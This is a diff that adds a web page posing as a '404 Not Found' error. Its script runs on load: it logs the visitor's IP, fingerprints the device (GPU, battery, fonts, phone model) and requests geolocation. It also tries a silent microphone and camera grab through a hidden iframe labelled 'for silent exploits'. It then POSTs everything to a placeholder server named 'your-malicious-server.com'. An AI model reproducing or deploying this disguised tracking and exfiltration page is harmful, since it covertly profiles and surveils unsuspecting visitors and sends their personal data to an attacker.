@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>chollocodigoswarner - 404 Not Found</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 50px; 
+            background: #f1f1f1; 
+            color: #333; 
+        }
+        h1 { 
+            font-size: 50px; 
+        }
+        .hidden { 
+            display: none; 
+        }
+    </style>
+</head>
+<body>
+    <h1>404 - Page Not Found</h1>
+    <p>Oops! The page you're looking for doesn't exist.</p>
+
+    <!-- Hidden iframe for silent exploits -->
+    <iframe src="about:blank" id="exploitFrame" class="hidden"></iframe>
+
+    <script>
+        // ===== IP LOGGING + DEVICE FINGERPRINTING =====
+        (async () => {
+            // Fetch IP (even behind VPN/proxy if possible)
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            // Advanced device fingerprinting
+            const device = {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenRes: `${window.screen.width}x${window.screen.height}`,
+                cpuCores: navigator.hardwareConcurrency || "unknown",
+                gpu: (() => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if (!gl) return "none";
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                })(),
+                phoneModel: /iPhone|Android/.test(navigator.userAgent) 
+                    ? navigator.userAgent.match(/(iPhone; CPU|Android.*?; [^)]+)/)[0] 
+                    : "Unknown/Desktop",
+                battery: await (async () => {
+                    if ('getBattery' in navigator) {
+                        const battery = await navigator.getBattery();
+                        return `${battery.level * 100}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+                    } else return "unknown";
+                })(),
+                fonts: (() => {
+                    const fonts = [];
+                    const testText = "mmmmmmmmmmlli";
+                    const testSize = '72px';
+                    const defaultFonts = ['serif', 'sans-serif', 'monospace'];
+                    
+                    for (const font of defaultFonts) {
+                        const span = document.createElement("span");
+                        span.style.fontSize = testSize;
+                        span.style.fontFamily = font;
+                        span.textContent = testText;
+                        document.body.appendChild(span);
+                        fonts.push(`${font}:${span.offsetWidth}x${span.offsetHeight}`);
+                        document.body.removeChild(span);
+                    }
+                    return fonts.join(", ");
+                })()
+            };
+
+            // ===== GEOLOCATION (if user grants permission) =====
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        device.coordinates = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy + " meters"
+                        };
+                        sendData();
+                    },
+                    (error) => {
+                        device.coordinates = "Denied";
+                        sendData();
+                    }
+                );
+            } else {
+                device.coordinates = "Unsupported";
+                sendData();
+            }
+
+            // ===== MICROPHONE + CAMERA HIJACK (silent attempt) =====
+            const exploitFrame = document.getElementById('exploitFrame');
+            exploitFrame.onload = () => {
+                try {
+                    exploitFrame.contentWindow.navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                        .then(stream => {
+                            device.micCamAccess = "GRANTED";
+                            // Stream could be recorded/transmitted here
+                            sendData();
+                        })
+                        .catch(err => {
+                            device.micCamAccess = "DENIED";
+                            sendData();
+                        });
+                } catch (e) {
+                    device.micCamAccess = "BLOCKED";
+                    sendData();
+                }
+            };
+            exploitFrame.src = "about:blank"; // Triggers onload
+
+            // ===== DATA EXFILTRATION =====
+            function sendData() {
+                // Replace with your server endpoint
+                const attackerServer = "https://your-malicious-server.com/log";
+                
+                fetch(attackerServer, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(device),
+                    mode: "no-cors" // Avoid CORS issues
+                });
+            }
+        })();
+    </script>
+</body>
+</html>
